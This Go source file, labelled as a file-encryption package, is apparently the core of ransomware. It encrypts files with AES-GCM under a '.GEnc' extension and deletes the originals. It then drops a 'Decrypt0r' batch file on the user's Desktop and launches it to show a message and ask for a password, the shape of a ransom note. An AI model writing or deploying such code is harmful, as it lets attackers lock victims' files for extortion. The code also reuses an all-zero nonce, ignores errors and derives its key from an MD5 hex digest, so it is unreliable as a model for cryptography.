/*
   This package allows you to encrypt
   and decrypt files in folders.
*/

package files_encryption

import (
	"os"
	"fmt"
	"strings"
	"os/exec"
	"os/user"
	"io/ioutil"
	"path/filepath"
	"encoding/base64"
	"encoding/hex"
	"crypto/cipher"
	"crypto/aes"
	"crypto/md5"
)

// Check
func check(e error) {
    if e != nil {
        fmt.Println(e)
    }
}

// Create hash
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

// Encrypt file by password
func EncryptFile(file string, passphrase string) string {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		fmt.Println("[FAILED] Encrypt file " + file + " not found!")
		return ""
	}
	read,  _ := ioutil.ReadFile(file)
	data     := base64.StdEncoding.EncodeToString([]byte(read))
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	gcm, err := cipher.NewGCM(block)
	check(err)
	nonce    := make([]byte, gcm.NonceSize())
	check(err)
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	ioutil.WriteFile(file + ".GEnc", ciphertext, 0644)
	os.Remove(file)
	fmt.Println("[SUCCESS] Encrypted file " + file)
	return file + ".GEnc"
}

// Decrypt file by password
func DecryptFile(file string, passphrase string) string {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		fmt.Println("[FAILED] Decrypt file " + file + " not found!")
		return ""
	}
	data, _ := ioutil.ReadFile(file)
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	check(err)
	gcm, err := cipher.NewGCM(block)
	check(err)
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	plaintext, _   = base64.StdEncoding.DecodeString(string(plaintext))
	ioutil.WriteFile( strings.Replace(file, ".GEnc", "", -1), plaintext, 0644)
	os.Remove(file)
	fmt.Println("[SUCCESS] Decrypted file " + file)
	return strings.Replace(file, ".GEnc", "", -1)
}

// Create 'decryptor.bat' file
func CreateDecryptor(message string) {
	file, err := filepath.Abs(os.Args[0])
	check(err)
	user, err := user.Current()
	check(err)
	ioutil.WriteFile(user.HomeDir + "\\Desktop\\decryptor.bat", []byte("@echo off \ncolor E \ntitle Decrypt0r \necho " + message + " \nset /p password=\"Enter password: \" \n" + file + " --decrypt %password% \nif %errorlevel% EQU 1 ( echo Wrong password! \ncolor CF ) ELSE ( echo Password is correct! & color D ) \npause >NUL \nexit"), 0644)
    exec.Command("cmd.exe", "/C start " + user.HomeDir + "\\Desktop\\decryptor.bat").Run()
}

// Remove 'decryptor.bat' file
func DeleteDecryptor() {
	user, err := user.Current()
	check(err)
	os.Remove(user.HomeDir + "\\Desktop\\decryptor.bat")
}